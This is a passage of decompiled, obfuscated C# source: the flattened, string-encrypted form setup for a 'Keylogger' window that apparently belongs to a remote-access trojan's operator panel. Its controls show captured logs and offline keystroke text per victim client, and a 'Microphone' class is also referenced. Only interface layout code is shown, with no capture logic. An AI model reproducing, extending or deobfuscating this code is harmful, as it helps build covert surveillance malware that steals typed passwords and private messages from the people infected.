            num1 = (int) num2 * 1610028464 ^ 882669300;
            continue;
          case 92:
            ((Keylogger) this).combologs.AllowDrop = true;
            num1 = (int) num2 * 1375812794 ^ 832933370;
            continue;
          case 93:
            ((Keylogger) this).loadinglogs.Visible = false;
            num1 = (int) num2 * -190131853 ^ 2129275057;
            continue;
          case 94:
            gridViewCellStyle3.BackColor = Color.White;
            num1 = (int) num2 * -2098334688 ^ -1799035091;
            continue;
          case 95:
            ((Keylogger) this).Panel3.Dock = DockStyle.Top;
            num1 = (int) num2 * 2010248339 ^ -383059852;
            continue;
          case 96:
            ((Keylogger) this).Button2 = new Button();
            num1 = (int) num2 * -1561002349 ^ -1098127009;
            continue;
          case 97:
            ((Keylogger) this).getbtn.UseVisualStyleBackColor = true;
            num1 = (int) num2 * 1106379319 ^ 1417706265;
            continue;
          case 98:
            ((Keylogger) this).Panel2.TabIndex = 5;
            num1 = (int) num2 * 504474236 ^ 1581498668;
            continue;
          case 99:
            ((Keylogger) this).Panel3.TabIndex = 4;
            num1 = (int) num2 * 1575486531 ^ -885701080;
            continue;
          case 100:
            ((Keylogger) this).Column6.Name = EXGuarder.\u003373B2E02;
            ((Keylogger) this).Column3.FillWeight = 250f;
            num1 = (int) num2 * -569764503 ^ 292649630;
            continue;
          case 101:
            ((Keylogger) this).savedbtn.UseVisualStyleBackColor = true;
            num1 = (int) num2 * -363733539 ^ 1811360166;
            continue;
          case 102:
            ((Keylogger) this).ctxMenu.ResumeLayout(false);
            num1 = (int) num2 * 312851436 ^ -588716139;
            continue;
          case 103:
            ((Keylogger) this).clinameinfo = new Label();
            ((Keylogger) this).exitbtn = new DrakeUIButtonIcon();
            num1 = (int) num2 * -397633462 ^ 1478397942;
            continue;
          case 104:
            ((Keylogger) this).Panel2.Dock = DockStyle.Top;
            num1 = (int) num2 * 785968066 ^ 1869305743;
            continue;
          case 105:
            ((Keylogger) this).SaveAsToolStripMenuItem.Size = new Size(96, 22);
            num1 = (int) num2 * 245221665 ^ -2008315057;
            continue;
          case 106:
            ((Keylogger) this).searchtext.Radius = 15;
            num1 = (int) num2 * -925622118 ^ 372940084;
            continue;
          case 107:
            ((Keylogger) this).ClientPic.Margin = new Padding(2, 3, 2, 3);
            num1 = (int) num2 * -1910381913 ^ 896261366;
            continue;
          case 108:
            ((Keylogger) this).exitbtn.ForeColor = Color.FromArgb(254, 0, 0);
            ((Keylogger) this).exitbtn.ForePressColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num2 * 1626988173 ^ -1492516323;
            continue;
          case 109:
            ((Keylogger) this).deleteallbtn.UseVisualStyleBackColor = true;
            ((Keylogger) this).backallbtn.Dock = DockStyle.Right;
            ((Keylogger) this).backallbtn.FlatStyle = FlatStyle.Flat;
            ((Keylogger) this).backallbtn.Font = new Font(EXGuarder.\u003250A4D25, 9f);
            num1 = (int) num2 * 200226863 ^ 568807884;
            continue;
          case 110:
            ((Keylogger) this).searchtext.ForeColor = Color.White;
            num1 = (int) num2 * 400534592 ^ -1845573283;
            continue;
          case 111:
            ((Keylogger) this).TabPage3.Size = new Size(856, 407);
            num1 = (int) num2 * -163212601 ^ -1414137196;
            continue;
          case 112:
            ((Keylogger) this).combologs.FormattingEnabled = true;
            ((Keylogger) this).combologs.ItemHeight = 20;
            num1 = (int) num2 * 1221799108 ^ -565955257;
            continue;
          case 113:
            ((Keylogger) this).clearsrchbtn.AvatarSize = 25;
            num1 = (int) num2 * 485317752 ^ 318996427;
            continue;
          case 114:
            ((Keylogger) this).getbtn.Name = EXGuarder.\u00377170E69;
            num1 = (int) num2 * -1160474732 ^ -139116485;
            continue;
          case 115:
            ((Keylogger) this).delbtn.Location = new Point(86, 0);
            num1 = (int) num2 * 1763714893 ^ 799358505;
            continue;
          case 116:
            ((Keylogger) this).DGV0.EditMode = DataGridViewEditMode.EditProgrammatically;
            num1 = (int) num2 * -1047616607 ^ -1883336709;
            continue;
          case 117:
            ((Keylogger) this).loadinglogs.Size = new Size(30, 33);
            ((Keylogger) this).loadinglogs.Style = UIStyle.Custom;
            num1 = (int) num2 * 1101485324 ^ 785866438;
            continue;
          case 118:
            ((Keylogger) this).TabPage4.Location = new Point(0, 40);
            num1 = (int) num2 * -2097439617 ^ 1815256517;
            continue;
          case 119:
            ((Keylogger) this).ClientPic.Size = new Size(32, 29);
            ((Keylogger) this).ClientPic.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * -1431879288 ^ 1192184771;
            continue;
          case 120:
            ((Keylogger) this).Panel3.Margin = new Padding(2, 2, 2, 2);
            ((Keylogger) this).Panel3.Name = EXGuarder.\u00345285903;
            num1 = (int) num2 * 2110656740 ^ -308007142;
            continue;
          case 121:
            ((Keylogger) this).offlinetext.Name = EXGuarder.\u003372E475D;
            num1 = (int) num2 * 212316862 ^ -1689823858;
            continue;
          case 122:
            ((Keylogger) this).combologs.CausesValidation = false;
            num1 = (int) num2 * 710093027 ^ 1628638219;
            continue;
          case 123:
            ((Keylogger) this).exitbtn.Font = new Font(EXGuarder.\u003250A4D25, 12f);
            num1 = (int) num2 * -546041320 ^ 1683639593;
            continue;
          case 124:
            ((Keylogger) this).DGV0.RowHeadersVisible = false;
            gridViewCellStyle1.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * -958745661 ^ -2138215550;
            continue;
          case 125:
            ((Keylogger) this).searchbtn.Name = EXGuarder.\u00315381F64;
            ((Keylogger) this).searchbtn.Size = new Size(25, 30);
            num1 = (int) num2 * -1118309332 ^ -1111482478;
            continue;
          case 126:
            ((Keylogger) this).deleteallbtn.TabIndex = 8;
            ((Keylogger) this).deleteallbtn.Text = EXGuarder.\u003531E4F49;
            num1 = (int) num2 * 424503577 ^ -2006649040;
            continue;
          case (uint) sbyte.MaxValue:
            ((Keylogger) this).combologs.Size = new Size(360, 25);
            num1 = (int) num2 * 1426798231 ^ 592273170;
            continue;
          case 128:
            ((Keylogger) this).Panel1.Size = new Size(856, 33);
            num1 = (int) num2 * 1703993655 ^ 834106136;
            continue;
          case 129:
            ((Keylogger) this).loadinglogs.Font = new Font(EXGuarder.\u003250A4D25, 12f);
            ((Keylogger) this).loadinglogs.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1487788951 ^ -481160039;
            continue;
          case 130:
            ((Keylogger) this).SaveToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 1539604422 ^ 1750431821;
            continue;
          case 131:
            ((Keylogger) this).DGV0 = new DataGridView();
            ((Keylogger) this).Column1 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 576645324 ^ 1244949017;
            continue;
          case 132:
            ((Keylogger) this).getbtn.Dock = DockStyle.Left;
            num1 = (int) num2 * -824965398 ^ 1591591351;
            continue;
          case 133:
            ((Keylogger) this).Panel2.Controls.Add((Control) ((Keylogger) this).DrakeUIButtonIcon1);
            num1 = (int) num2 * -970775530 ^ 1941736876;
            continue;
          case 134:
            ((Keylogger) this).searchtext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1028118206 ^ 1186599987;
            continue;
          case 135:
            ((Keylogger) this).ClientPic = new PictureBox();
            ((ISupportInitialize) ((Keylogger) this).DGV0).BeginInit();
            ((Keylogger) this).ctxMenu.SuspendLayout();
            num1 = (int) num2 * -359425759 ^ -1705652617;
            continue;
          case 136:
            gridViewCellStyle2.Font = new Font(EXGuarder.\u003250A4D25, 12f);
            gridViewCellStyle2.ForeColor = Color.FromArgb(190, 190, 190);
            gridViewCellStyle2.SelectionBackColor = Color.FromArgb(190, 190, 190);
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            gridViewCellStyle2.WrapMode = DataGridViewTriState.False;
            num1 = (int) num2 * 232089757 ^ -694489412;
            continue;
          case 137:
            ((Keylogger) this).Button2.Visible = false;
            ((Keylogger) this).keytabs.Controls.Add((Control) ((Keylogger) this).TabPage3);
            num1 = (int) num2 * -227414259 ^ 201293247;
            continue;
          case 138:
            this.Opacity = 0.0;
            num1 = (int) num2 * 560611546 ^ 1027104489;
            continue;
          case 139:
            ((Keylogger) this).offlinetext.ReadOnly = true;
            ((Keylogger) this).offlinetext.Size = new Size(856, 344);
            ((Keylogger) this).offlinetext.TabIndex = 5;
            num1 = (int) num2 * 928198703 ^ -919547999;
            continue;
          case 140:
            ((Keylogger) this).getbtn.Text = EXGuarder.\u00354695755;
            num1 = (int) num2 * -833848546 ^ 581911254;
            continue;
          case 141:
            ((Keylogger) this).Column6.HeaderText = EXGuarder.\u003512F1221;
            num1 = (int) num2 * -1080388180 ^ 2090461919;
            continue;
          case 142:
            ((Keylogger) this).Panel1.Controls.Add((Control) ((Keylogger) this).getbtn);
            num1 = (int) num2 * -871013693 ^ 1162550202;
            continue;
          case 143:
            ((Keylogger) this).delbtn.Name = EXGuarder.\u0030D113153;
            ((Keylogger) this).delbtn.Size = new Size(94, 33);
            ((Keylogger) this).delbtn.TabIndex = 6;
            ((Keylogger) this).delbtn.Text = EXGuarder.\u003036F0B07;
            num1 = (int) num2 * 440516780 ^ 236261189;
            continue;
          case 144:
            ((Keylogger) this).searchbtn.Dock = DockStyle.Left;
            ((Keylogger) this).searchbtn.FillColor = Color.Black;
            ((Keylogger) this).searchbtn.Font = new Font(EXGuarder.\u003250A4D25, 12f);
            num1 = (int) num2 * 1321132184 ^ 1831138065;
            continue;
          case 145:
            ((Keylogger) this).TabPage3.TabIndex = 0;
            ((Keylogger) this).TabPage3.Text = EXGuarder.\u0032574423D;
            num1 = (int) num2 * 1897900520 ^ -2120652838;
            continue;
          case 146:
            ((Keylogger) this).TabPage4.BackColor = Color.Black;
            ((Keylogger) this).TabPage4.Controls.Add((Control) ((Keylogger) this).offlinetext);
            num1 = (int) num2 * -96110873 ^ -76461194;
            continue;
          case 147:
            ((Keylogger) this).DrakeUIButtonIcon1.TabIndex = 50;
            num1 = (int) num2 * 259975149 ^ 1130538860;
            continue;
          case 148:
            ((Keylogger) this).Panel1.TabIndex = 3;
            num1 = (int) num2 * 1757075530 ^ -1378763715;
            continue;
          case 149:
            ((Keylogger) this).combologs.DropDownStyle = UIDropDownStyle.DropDownList;
            ((Keylogger) this).combologs.FillColor = Color.White;
            num1 = (int) num2 * -1903376169 ^ 16603554;
            continue;
          case 150:
            ((Keylogger) this).DGV0.RowsDefaultCellStyle = gridViewCellStyle1;
            num1 = (int) num2 * 366678638 ^ -4038774;
            continue;
          case 151:
            ((Keylogger) this).ctxMenu.Items.AddRange(new ToolStripItem[2]
            {
              (ToolStripItem) ((Keylogger) this).SaveToolStripMenuItem,
              (ToolStripItem) ((Keylogger) this).SaveAsToolStripMenuItem
            });
            ((Keylogger) this).ctxMenu.Name = EXGuarder.\u0037501794C;
            num1 = (int) num2 * 417244686 ^ -1804864712;
            continue;
          case 152:
            ((Keylogger) this).ctxMenu.ImageScalingSize = new Size(20, 20);
            num1 = (int) num2 * 1861812023 ^ -169775067;
            continue;
          case 153:
            ((Keylogger) this).DrakeUIButtonIcon1.Name = EXGuarder.\u00302560448;
            num1 = (int) num2 * 1995641136 ^ 999400658;
            continue;
          case 154:
            ((Keylogger) this).searchbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Keylogger) this).searchbtn.Location = new Point(0, 0);
            num1 = (int) num2 * -1916907860 ^ 1218526676;
            continue;
          case 155:
            ((Keylogger) this).backallbtn.Location = new Point(727, 0);
            num1 = (int) num2 * -1873645147 ^ -1694161542;
            continue;
          case 156:
            this.Controls.Add((Control) ((Keylogger) this).Panel2);
            num1 = (int) num2 * 1100160157 ^ -253180533;
            continue;
          case 157:
            this.Name = EXGuarder.\u0031E77480B;
            num1 = (int) num2 * 1948019492 ^ 1261472609;
            continue;
          case 158:
            ((Keylogger) this).Panel3.Size = new Size(856, 30);
            num1 = (int) num2 * -1631248766 ^ 157737194;
            continue;
          case 159:
            ((Keylogger) this).Column2.SortMode = DataGridViewColumnSortMode.Programmatic;
            num1 = (int) num2 * -600297077 ^ -1282903288;
            continue;
          case 160:
            ((Keylogger) this).combologs.Font = new Font(EXGuarder.\u003250A4D25, 11f);
            num1 = (int) num2 * -2023691765 ^ 92513448;
            continue;
          case 161:
            ((Keylogger) this).Column1.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
            ((Keylogger) this).Column1.HeaderText = EXGuarder.\u0032F10154B;
            num1 = (int) num2 * -1715872835 ^ -2088044423;
            continue;
          case 162:
            gridViewCellStyle3.SelectionBackColor = SystemColors.Highlight;
            num1 = (int) num2 * 1879454470 ^ -445064734;
            continue;
          case 163:
            ((Keylogger) this).combologs.Location = new Point(186, 8);
            num1 = (int) num2 * -1442180803 ^ -1110613087;
            continue;
          case 164:
            ((Keylogger) this).TabPage4.Size = new Size(856, 407);
            num1 = (int) num2 * 786590408 ^ -163214374;
            continue;
          case 165:
            ((Keylogger) this).exitbtn.Dock = DockStyle.Right;
            ((Keylogger) this).exitbtn.FillColor = Color.Transparent;
            num1 = (int) num2 * 3423893 ^ 860416179;
            continue;
          case 166:
            ((Keylogger) this).Button2.Size = new Size((int) sbyte.MaxValue, 24);
            ((Keylogger) this).Button2.TabIndex = 3;
            ((Keylogger) this).Button2.Text = EXGuarder.\u0033D746E03;
            num1 = (int) num2 * -644466280 ^ 322015503;
            continue;
          case 167:
            ((Keylogger) this).DGV0.AllowUserToDeleteRows = false;
            num1 = (int) num2 * 366735418 ^ -1816821510;
            continue;
          case 168:
            ((Keylogger) this).delbtn.UseVisualStyleBackColor = true;
            ((Keylogger) this).savedbtn.Dock = DockStyle.Right;
            num1 = (int) num2 * 812103704 ^ -1874738457;
            continue;
          case 169:
            ((Keylogger) this).exitbtn.RectPressColor = Color.White;
            ((Keylogger) this).exitbtn.RectSelectedColor = Color.White;
            num1 = (int) num2 * -872593703 ^ -80875888;
            continue;
          case 170:
            ((Keylogger) this).searchtext.Cursor = Cursors.IBeam;
            ((Keylogger) this).searchtext.FillColor = Color.Black;
            num1 = (int) num2 * -1871086248 ^ -463880642;
            continue;
          case 171:
            ((Keylogger) this).TabPage3 = new TabPage();
            num1 = (int) num2 * -1750045176 ^ 595594153;
            continue;
          case 172:
            ((Keylogger) this).searchbtn = new DrakeUIAvatar();
            num1 = (int) num2 * 1426974128 ^ -6803237;
            continue;
          case 173:
            ((Keylogger) this).loadinglogs.Text = EXGuarder.\u00341683A73;
            num1 = (int) num2 * 256573531 ^ 1208771552;
            continue;
          case 174:
            ((Keylogger) this).SaveAsToolStripMenuItem.Visible = false;
            ((Keylogger) this).Panel1.Controls.Add((Control) ((Keylogger) this).loadinglogs);
            ((Keylogger) this).Panel1.Controls.Add((Control) ((Keylogger) this).deleteallbtn);
            ((Keylogger) this).Panel1.Controls.Add((Control) ((Keylogger) this).backallbtn);
            num1 = (int) num2 * -349580040 ^ -1247589201;
            continue;
          case 175:
            ((Keylogger) this).clinameinfo.TextAlign = ContentAlignment.MiddleLeft;
            ((Keylogger) this).exitbtn.BackColor = Color.Transparent;
            num1 = (int) num2 * 361936845 ^ -324312407;
            continue;
          case 176:
            ((Keylogger) this).clearsrchbtn.StyleCustomMode = true;
            ((Keylogger) this).clearsrchbtn.Symbol = 77;
            ((Keylogger) this).clearsrchbtn.SymbolSize = 30;
            num1 = (int) num2 * -2047563695 ^ -1792577221;
            continue;
          case 177:
            ((Keylogger) this).searchtext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -165625167 ^ 1917668599;
            continue;
          case 178:
            ((Keylogger) this).offlinetext.Location = new Point(0, 30);
            num1 = (int) num2 * 1840513451 ^ 1679618183;
            continue;
          case 179:
            ((Keylogger) this).exitbtn.Location = new Point(716, 0);
            ((Keylogger) this).exitbtn.Name = EXGuarder.\u003264B3166;
            ((Keylogger) this).exitbtn.Radius = 10;
            num1 = (int) num2 * -1707670033 ^ -137090688;
            continue;
          case 180:
            ((Keylogger) this).Panel1.ResumeLayout(false);
            num1 = (int) num2 * -1106908826 ^ -70272270;
            continue;
          case 181:
            ((Keylogger) this).DrakeUIButtonIcon1 = new DrakeUIButtonIcon();
            num1 = (int) num2 * 1892759237 ^ 1853942986;
            continue;
          case 182:
            ((Keylogger) this).TabPage4.Text = EXGuarder.\u0036D102629;
            ((Keylogger) this).offlinetext.BackColor = Color.Black;
            ((Keylogger) this).offlinetext.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * -1621457169 ^ -1014152397;
            continue;
          case 183:
            ((Keylogger) this).searchbtn.Style = UIStyle.Custom;
            ((Keylogger) this).searchbtn.StyleCustomMode = true;
            num1 = (int) num2 * -822078297 ^ 1955285763;
            continue;
          case 184:
            ((Keylogger) this).Column2.HeaderText = EXGuarder.\u0035A6C3720;
            num1 = (int) num2 * -203102403 ^ -128692287;
            continue;
          case 185:
            ((Keylogger) this).clearsrchbtn.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            num1 = (int) num2 * -908400774 ^ -1709511060;
            continue;
          case 186:
            ((Keylogger) this).TabPage4.ResumeLayout(false);
            num1 = (int) num2 * -20680671 ^ 1282527363;
            continue;
          case 187:
            ((Keylogger) this).clinameinfo.Text = EXGuarder.\u0032B3C2858;
            num1 = (int) num2 * -1783073329 ^ -201107514;
            continue;
          case 188:
            ((Keylogger) this).SaveToolStripMenuItem.Size = new Size(96, 22);
            ((Keylogger) this).SaveToolStripMenuItem.Text = EXGuarder.\u00369611157;
            num1 = (int) num2 * -886263532 ^ -1955837765;
            continue;
          case 189:
            ((Keylogger) this).searchtext.StyleCustomMode = true;
            num1 = (int) num2 * 2037452435 ^ 173537780;
            continue;
          case 190:
            ((Keylogger) this).delbtn = new Button();
            num1 = (int) num2 * -827179036 ^ -953749401;
            continue;
          case 191:
            ((Keylogger) this).Button2.UseVisualStyleBackColor = true;
            num1 = (int) num2 * -1825198599 ^ 1833850691;
            continue;
          case 192:
            ((Keylogger) this).Panel2.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * 858110664 ^ 1899248343;
            continue;
          case 193:
            ((Keylogger) this).exitbtn.Size = new Size(70, 29);
            num1 = (int) num2 * 552395466 ^ -1506633323;
            continue;
          case 194:
            ((Keylogger) this).offlinetext.Dock = DockStyle.Fill;
            num1 = (int) num2 * 1971129012 ^ -1093493768;
            continue;
          case 195:
            ((Keylogger) this).DrakeUIButtonIcon1.RectPressColor = Color.White;
            ((Keylogger) this).DrakeUIButtonIcon1.RectSelectedColor = Color.White;
            num1 = (int) num2 * -881875570 ^ -661601099;
            continue;
          case 196:
            ((Keylogger) this).keytabs.SelectedIndex = 0;
            num1 = (int) num2 * -1680175565 ^ -271499172;
            continue;
          case 197:
            ((Keylogger) this).Column2.FillWeight = 1f;
            num1 = (int) num2 * -1588204795 ^ 472509312;
            continue;
          case 198:
            ((Keylogger) this).backallbtn.Name = EXGuarder.\u003510B2C4B;
            num1 = (int) num2 * -1430843840 ^ 80460931;
            continue;
          case 199:
            ((Keylogger) this).clearsrchbtn.Style = UIStyle.Custom;
            num1 = (int) num2 * 1456166080 ^ -1713591768;
            continue;
          case 200:
            ((Keylogger) this).TabPage3.BackColor = Color.Black;
            num1 = (int) num2 * 1380086397 ^ -672749781;
            continue;
          case 201:
            ((Keylogger) this).exitbtn.Style = UIStyle.Custom;
            num1 = (int) num2 * 683467801 ^ -1904039380;
            continue;
          case 202:
            ((Keylogger) this).searchtext.Minimum = (double) int.MinValue;
            ((Keylogger) this).searchtext.Name = EXGuarder.\u00374423A69;
            num1 = (int) num2 * -596500197 ^ -14377922;
            continue;
          case 203:
            ((Keylogger) this).ClientPic.TabIndex = 11;
            ((Keylogger) this).ClientPic.TabStop = false;
            num1 = (int) num2 * -342295844 ^ 2095825598;
            continue;
          case 204:
            ((Keylogger) this).DrakeUIButtonIcon1.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num2 * -587196161 ^ -1523606602;
            continue;
          case 205:
            ((Keylogger) this).DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            ((Keylogger) this).DGV0.Columns.AddRange((DataGridViewColumn) ((Keylogger) this).Column1, (DataGridViewColumn) ((Keylogger) this).Column6, (DataGridViewColumn) ((Keylogger) this).Column3, (DataGridViewColumn) ((Keylogger) this).Column2);
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * 757331082 ^ 1139452100;
            continue;
          case 206:
            ((Keylogger) this).exitbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            ((Keylogger) this).exitbtn.FillPressColor = Color.Black;
            num1 = (int) num2 * -1379621430 ^ 54558317;
            continue;
          case 207:
            ((Keylogger) this).Panel3.Controls.Add((Control) ((Keylogger) this).clearsrchbtn);
            ((Keylogger) this).Panel3.Controls.Add((Control) ((Keylogger) this).searchtext);
            ((Keylogger) this).Panel3.Controls.Add((Control) ((Keylogger) this).searchbtn);
            num1 = (int) num2 * 363807513 ^ 23304456;
            continue;
          case 208:
            ((Keylogger) this).SaveToolStripMenuItem.Visible = false;
            ((Keylogger) this).SaveAsToolStripMenuItem.Name = EXGuarder.\u0034D642140;
            num1 = (int) num2 * -1580842810 ^ -1028194810;
            continue;
          case 209:
            ((Keylogger) this).SaveAsToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 1741658053 ^ -1783495741;
            continue;
          case 210:
            ((Keylogger) this).keytabs.TabUnSelectedForeColor = Color.FromArgb(240, 240, 240);
            num1 = (int) num2 * -1129499177 ^ 688547771;
            continue;
          case 211:
            ((Keylogger) this).DrakeUIButtonIcon1.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1999788967 ^ 726597990;
            continue;
          case 212:
            ((Keylogger) this).Panel1 = new Panel();
            num1 = (int) num2 * 1266814678 ^ -522452677;
            continue;
          case 213:
            ((Keylogger) this).DGV0.EnableHeadersVisualStyles = false;
            num1 = (int) num2 * 1683901948 ^ 115020114;
            continue;
          case 214:
            ((Keylogger) this).keytabs.ItemSize = new Size(470, 40);
            num1 = (int) num2 * 1471738852 ^ -1990822347;
            continue;
          case 215:
            ((Keylogger) this).DGV0.BackgroundColor = Color.Black;
            num1 = (int) num2 * -1131443900 ^ -1828270952;
            continue;
          case 216:
            ((Keylogger) this).searchtext.Watermark = EXGuarder.\u003732B2C77;
            num1 = (int) num2 * 170336922 ^ -1531870499;
            continue;
          case 217:
            ((Keylogger) this).searchtext.Margin = new Padding(4, 4, 4, 4);
            ((Keylogger) this).searchtext.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * -962896596 ^ 1895402766;
            continue;
          case 218:
            ((Keylogger) this).DGV0.AllowUserToResizeColumns = false;
            ((Keylogger) this).DGV0.AllowUserToResizeRows = false;
            num1 = (int) num2 * -1021657804 ^ -2119470729;
            continue;
          case 219:
            gridViewCellStyle3.Font = new Font(EXGuarder.\u003250A4D25, 12f);
            gridViewCellStyle3.ForeColor = Color.Black;
            num1 = (int) num2 * -551863473 ^ -2129196221;
            continue;
          case 220:
            ((Keylogger) this).Column3.HeaderText = EXGuarder.\u0031706360B;
            num1 = (int) num2 * -25832508 ^ 91482304;
            continue;
          case 221:
            ((Keylogger) this).DrakeUIButtonIcon1.Radius = 10;
            num1 = (int) num2 * 1853264274 ^ 511227341;
            continue;
          case 222:
            ((Keylogger) this).DrakeUIButtonIcon1.Location = new Point(786, 0);
            num1 = (int) num2 * -752808886 ^ 646170232;
            continue;
          case 223:
            ((Keylogger) this).backallbtn.Size = new Size(74, 33);
            num1 = (int) num2 * 1689021494 ^ 1217674005;
            continue;
          case 224:
            goto label_3;
          case 225:
            ((Keylogger) this).combologs.BackColor = Color.Transparent;
            num1 = (int) num2 * 310553071 ^ 1453334841;
            continue;
          case 226:
            ((Keylogger) this).combologs.MinimumSize = new Size(47, 0);
            ((Keylogger) this).combologs.Name = EXGuarder.\u00342412664;
            ((Keylogger) this).combologs.Padding = new Padding(0, 0, 30, 0);
            num1 = (int) num2 * -1181414156 ^ -2056193859;
            continue;
          case 227:
            ((Keylogger) this).backallbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1387940949 ^ 436751498;
            continue;
          case 228:
            ((Keylogger) this).loadinglogs.Enabled = false;
            num1 = (int) num2 * -1862432536 ^ -553437303;
            continue;
          case 229:
            ((Keylogger) this).DGV0.BorderStyle = BorderStyle.None;
            ((Keylogger) this).DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
            ((Keylogger) this).DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            gridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleCenter;
            num1 = (int) num2 * -588479602 ^ -1906879291;
            continue;
          case 230:
            ((Keylogger) this).Column1.Name = EXGuarder.\u003314A5B3C;
            num1 = (int) num2 * 1504535699 ^ 970487101;
            continue;
          case 231:
            ((Keylogger) this).Button2.ForeColor = Color.Cyan;
            ((Keylogger) this).Button2.Location = new Point(612, 142);
            ((Keylogger) this).Button2.Name = EXGuarder.\u0036E691B64;
            num1 = (int) num2 * 809323400 ^ -708654751;
            continue;
          case 232:
            ((Keylogger) this).backallbtn.TabIndex = 7;
            num1 = (int) num2 * -1642309043 ^ 232393563;
            continue;
          case 233:
            ((Keylogger) this).searchtext.Style = UIStyle.Custom;
            num1 = (int) num2 * -2144416555 ^ 1363732050;
            continue;
          case 234:
            ((Keylogger) this).Panel2.Name = EXGuarder.\u0033B410C28;
            ((Keylogger) this).Panel2.Size = new Size(856, 29);
            num1 = (int) num2 * 1528823755 ^ 821319072;
            continue;
          case 235:
            ((Keylogger) this).Panel2.ForeColor = Color.Red;
            num1 = (int) num2 * 12462083 ^ 588979;
            continue;
          case 236:
            ((Keylogger) this).loadinglogs.TabIndex = 4;
            num1 = (int) num2 * -506594436 ^ 896626880;
            continue;
          case 237:
            ((Keylogger) this).searchtext.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num2 * -1495664971 ^ -559689221;
            continue;
          case 238:
            ((Keylogger) this).getbtn.Size = new Size(86, 33);
            ((Keylogger) this).getbtn.TabIndex = 0;
            num1 = (int) num2 * 131336391 ^ 1300523970;
            continue;
          case 239:
            ((Keylogger) this).deleteallbtn = new Button();
            ((Keylogger) this).backallbtn = new Button();
            num1 = (int) num2 * 667905049 ^ 135517837;
            continue;
          case 240:
            ((Keylogger) this).ctxMenu.ShowImageMargin = false;
            ((Keylogger) this).ctxMenu.Size = new Size(97, 48);
            num1 = (int) num2 * -151657726 ^ -1782677006;
            continue;
          case 241:
            ((Keylogger) this).loadinglogs = new DrakeUILoadingBar();
            num1 = (int) num2 * -34340375 ^ -385460612;
            continue;
          case 242:
            ((Keylogger) this).Panel1.Controls.Add((Control) ((Keylogger) this).combologs);
            ((Keylogger) this).Panel1.Controls.Add((Control) ((Keylogger) this).delbtn);
            num1 = (int) num2 * 1742186315 ^ 434228455;
            continue;
          case 243:
            gridViewCellStyle3 = new DataGridViewCellStyle();
            num1 = (int) num2 * -1905983137 ^ 982748681;
            continue;
          case 244:
            ((Keylogger) this).delbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1265139671 ^ 177084666;
            continue;
          case 245:
            ((Keylogger) this).keytabs = new DrakeUITabControl();
            num1 = (int) num2 * -57184907 ^ 1165684865;
            continue;
          case 246:
            ((Keylogger) this).combologs = new DrakeUIComboBox();
            num1 = (int) num2 * 1625518918 ^ 952741934;
            continue;
          case 247:
            ((Keylogger) this).DrakeUIButtonIcon1.SymbolSize = 0;
            num1 = (int) num2 * -358802876 ^ -1386127286;
            continue;
          case 248:
            ((Keylogger) this).Panel2.Controls.Add((Control) ((Keylogger) this).ClientPic);
            num1 = (int) num2 * 396638364 ^ -1847220385;
            continue;
          case 249:
            ((Keylogger) this).Column3 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 1354229670 ^ -1791836078;
            continue;
          case 250:
            ((Keylogger) this).clearsrchbtn.Size = new Size(20, 20);
            num1 = (int) num2 * -1334764268 ^ 885664505;
            continue;
          case 251:
            ((Keylogger) this).Column2 = new DataGridViewImageColumn();
            ((Keylogger) this).ctxMenu = new ContextMenuStrip(((Microphone) this).components);
            num1 = (int) num2 * 217657010 ^ 1500080954;
            continue;
          case 252:
            ((Keylogger) this).Column2.ImageLayout = DataGridViewImageCellLayout.Zoom;
            ((Keylogger) this).Column2.MinimumWidth = 2;
            num1 = (int) num2 * -292313777 ^ -783183238;
            continue;
          case 253:
            ((Keylogger) this).DrakeUIButtonIcon1.RectHoverColor = Color.White;
            num1 = (int) num2 * 153901544 ^ 1902955933;
            continue;
          case 254:
            ((Keylogger) this).SaveToolStripMenuItem.Name = EXGuarder.\u00315104D2B;
            num1 = (int) num2 * 2130235618 ^ 1257817451;
            continue;
          case (uint) byte.MaxValue:
            ((Keylogger) this).Panel1.SuspendLayout();
            ((Keylogger) this).keytabs.SuspendLayout();
            num1 = (int) num2 * 810051672 ^ 383694625;
            continue;
          case 256:
            ((Keylogger) this).searchtext.Location = new Point(34, 6);
            num1 = (int) num2 * 881266992 ^ 500209684;
            continue;
          case 257:
            ((Keylogger) this).clinameinfo.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1105532338 ^ 1954799153;
            continue;
          case 258:
            ((Keylogger) this).keytabs.TabBackColor = Color.Black;
            ((Keylogger) this).keytabs.TabIndex = 4;
            num1 = (int) num2 * 619906592 ^ -170567492;
            continue;
          case 259:
            ((Keylogger) this).TabPage3.Controls.Add((Control) ((Keylogger) this).DGV0);
            ((Keylogger) this).TabPage3.Location = new Point(0, 40);
